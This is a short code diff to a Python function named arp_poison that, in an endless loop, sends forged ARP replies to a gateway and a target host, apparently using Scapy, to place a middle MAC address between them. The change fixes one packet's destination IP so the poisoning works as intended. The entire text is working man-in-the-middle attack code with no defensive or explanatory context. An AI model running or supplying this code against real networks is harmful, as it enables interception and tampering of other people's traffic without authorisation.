@@ -17,13 +17,15 @@ def arp_poison(gate_ip,gate_mac,target_ip,target_mac):
     while True:
         arp_gateway=ARP(op=2,pdst=gate_ip,hwdst=gate_mac,psrc=target_ip)
         send(arp_gateway)
+
         arp_target=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gate_ip)
         send(arp_target)
 
         mac_middle="02:42:c6:0d:00:af"
         arp_gateway_mac=ARP(op=2,pdst=gate_ip,hwdst=gate_mac,hwsrc=mac_middle)
         send(arp_gateway_mac)
-        arp_target_mac=ARP(op=2,pdst=gate_ip,hwdst=target_mac,hwsrc=mac_middle)
+
+        arp_target_mac=ARP(op=2,pdst=target_ip,hwdst=target_mac,hwsrc=mac_middle)
         send(arp_target_mac)
         time.sleep(2)
 
